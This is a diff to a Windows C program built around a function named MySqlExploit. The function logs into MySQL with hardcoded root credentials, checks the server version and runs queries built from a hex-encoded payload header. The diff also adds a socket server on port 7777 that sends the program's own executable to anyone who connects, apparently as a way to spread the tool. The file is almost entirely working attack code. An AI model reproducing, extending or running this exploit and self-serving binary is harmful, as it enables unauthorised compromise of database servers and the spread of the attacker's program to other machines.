@@ -3,6 +3,7 @@
 
 #include <stdio.h>
 #include <WINDOWS.H>
+#include <winsock.h>
 #include <tchar.h>
 #include <io.h>
 #include <time.h>
@@ -10,6 +11,7 @@
 #include "hex_code.h"
 
 #pragma comment(lib,"libmysql.lib")
+#pragma comment(lib,"ws2_32.lib")
 
 MYSQL mysql;
 void wait()
@@ -52,7 +54,7 @@ BOOL doQuery(char *result,char *query)
 		return FALSE;
 	}
 	else printf("Query Success.\n");
-		
+
 
 	return TRUE;
 }
@@ -74,13 +76,12 @@ void gen_random(char *s, const int len)
 }
 
 #define QUERY_LENGTH (102400)
-int _tmain(int argc, _TCHAR* argv[])
+void MySqlExploit(char *host,char *root,char *pwd)
 {
 	char *query = (char *)malloc(QUERY_LENGTH);
 	char name[10] = {0};
-	gen_random(name,8);
 	ZeroMemory(query,QUERY_LENGTH);
-	mysql_init(&mysql);
+	gen_random(name,8);
 	__try
 	{
 		char result[1024] = {0};
@@ -106,7 +107,7 @@ int _tmain(int argc, _TCHAR* argv[])
 			int minor_version = (version % 10000) / 100;
 			if (major_version >= 5 && minor_version >= 1)
 			{
-				fprintf(stderr,"MySql Version too high, not support!");
+				fprintf(stderr,"MySql Version is too high, not support!");
 				__leave;
 			}
 		}
@@ -135,11 +136,98 @@ int _tmain(int argc, _TCHAR* argv[])
 	}
 	__finally
 	{
-		mysql_close(&mysql);
-		mysql_library_end();
 		free(query);
 	}
+}
 
+SOCKET m_socket;
+void runServer()
+{
+	SOCKADDR_IN addrClient;
+	char filename[MAX_PATH] = {0};
+	int len = sizeof(SOCKADDR);
+	char *Buffer = (char *)malloc(QUERY_LENGTH);
+	DWORD dwNumberOfBytesRead;
+	HANDLE hFile;
+	unsigned long long file_size = 0;
+	ZeroMemory(Buffer,QUERY_LENGTH);
+	GetModuleFileNameA(NULL,filename,MAX_PATH);
+
+	while (TRUE)
+	{
+		SOCKET sockConn = accept(m_socket,(SOCKADDR *)&addrClient,&len);
+		hFile = CreateFileA(filename,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
+		if (hFile == INVALID_HANDLE_VALUE)
+			break;
+		file_size = GetFileSize(hFile,NULL);
+
+		send(sockConn,(char *)&file_size,sizeof(unsigned long long)+1,0);
+
+		do 
+		{
+			ReadFile(hFile,Buffer,sizeof(Buffer),&dwNumberOfBytesRead,NULL);
+			send(sockConn,Buffer,dwNumberOfBytesRead,0);
+		} while (dwNumberOfBytesRead);
+
+		CloseHandle(hFile);
+	}
+
+}
+
+BOOL InitSocket()
+{
+	WORD wVersionRequested;
+	WSADATA wsaData;
+	int err;
+	SOCKADDR_IN addrSrv;
+	wVersionRequested = MAKEWORD(1,1);
+	err = WSAStartup(wVersionRequested,&wsaData);
+	if (err != 0)
+		return FALSE;
+	if (LOBYTE(wsaData.wVersion) != 1 || HIBYTE(wsaData.wVersion) != 1)
+	{
+		WSACleanup();
+		return FALSE;
+	}
+
+	m_socket = socket(AF_INET,SOCK_STREAM,0);
+	if (m_socket == INVALID_SOCKET)
+	{
+		printf("Create socket failed.\n");
+		return FALSE;
+	}
+	
+	addrSrv.sin_addr.S_un.S_addr = htonl(INADDR_ANY);
+	addrSrv.sin_family = AF_INET;
+	addrSrv.sin_port = htons(7777);
+
+	err = bind(m_socket,(SOCKADDR *)&addrSrv,sizeof(SOCKADDR));
+	if (err == SOCKET_ERROR)
+	{
+		closesocket(m_socket);
+		printf("Bind socket failed.\n");
+		return FALSE;
+	}
+
+	listen(m_socket,5);
+	return TRUE;
+}
+
+int _tmain(int argc, _TCHAR* argv[])
+{	
+	InitSocket();
+	CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)runServer,NULL,0,NULL);
+	mysql_init(&mysql);
+
+	do 
+	{
+		MySqlExploit("127.0.0.1","root","cc");
+		break;
+	} while (TRUE);
+
+	mysql_close(&mysql);
+	mysql_library_end();
+	
 	wait();
 	return 0;
 }
